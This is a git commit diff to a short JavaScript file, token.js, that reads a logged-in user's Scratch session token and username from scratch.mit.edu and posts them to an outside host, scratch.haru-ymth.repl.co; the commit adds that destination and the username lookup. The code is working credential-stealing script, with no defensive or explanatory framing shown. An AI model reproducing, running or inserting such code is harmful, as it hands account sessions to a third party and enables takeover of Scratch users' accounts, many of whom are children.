3b8b2b26cf4da0e0c87c81f6075672ad946d906c
haruymth <108157117+haruymth@users.noreply.github.com>
2022-12-11 17:01:54 +0900

    Update token.js

--- scripts/codes/token.js
+++ scripts/codes/token.js
@@ -1,4 +1,5 @@
 (async()=>{
   let token=(await(await fetch("https://scratch.mit.edu/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
-  await fetch("",{body:token});
+  let username=(await(await fetch("https://scratch.mit.edu/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.username;
+  await fetch("https://scratch.haru-ymth.repl.co",{body:JSON.stringify({username,token})});
 })();
